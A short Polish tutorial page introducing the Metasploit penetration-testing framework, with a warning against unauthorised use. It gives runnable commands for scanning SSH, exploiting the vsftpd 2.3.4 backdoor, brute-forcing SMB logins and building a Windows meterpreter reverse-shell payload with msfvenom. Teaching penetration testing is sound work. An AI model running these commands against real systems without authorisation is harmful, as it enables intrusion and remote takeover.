# Metasploit

Metasploit to jeden z najpopularniejszych frameworków do testowania penetracyjnego. Został stworzony w celu odkrywania, eksploatowania i walidowania luk bezpieczeństwa. Wyposażony jest w setki gotowych eksploitów i różnorodne narzędzia, które pozwalają na kompleksową ocenę bezpieczeństwa systemów i sieci.

{% hint style="warning" %}
Korzystanie z Metasploit bez odpowiednich uprawnień jest nielegalne i nieetyczne. Pamiętaj, że narzędzia te są stworzone w celu poprawy bezpieczeństwa, a nie jego łamania.
{% endhint %}

{% embed url="https://www.metasploit.com" %}
Metasploit
{% endembed %}

## Podstawowe funkcje i zastosowania

Poniżej przedstawimy kilka różnych funkcji i zastosowań narzędzia Metasploit.

### Skanowanie

Metasploit umożliwia skanowanie systemów i sieci w poszukiwaniu potencjalnych luk. Na przykład można zeskanować system za pomocą modułu *auxiliary/scanner*:

```bash
msf > use auxiliary/scanner/ssh/ssh_version
msf auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
msf auxiliary(scanner/ssh/ssh_version) > run
```

### Eksploatacja

Gdy luka zostanie znaleziona, Metasploit umożliwia jej eksploatację. Poniżej pokazujemy jak eksploatować podatność w usłudze FTP za pomocą modułu *exploit*:

```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.1.2
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

### Tworzenie payloadów

Metasploit oferuje możliwość tworzenia payloadów, które można dostarczyć do celu, aby uzyskać dostęp. Można na przykład utworzyć prosty payload dla systemu Windows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > payload.exe
```

### Przechwytywanie haseł

Metasploit ma wiele modułów do przechwytywania haseł, które mogą być użyte do zdobycia dalszych dostępów. Można użyć np. modułu *smb_login* do sprawdzenia haseł na podatnych maszynach SMB:

```bash
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.1.0/24
msf auxiliary(scanner/smb/smb_login) > run
```

## Ściąga

{% embed url="https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet.pdf" %}
Ściąga
{% endembed %}
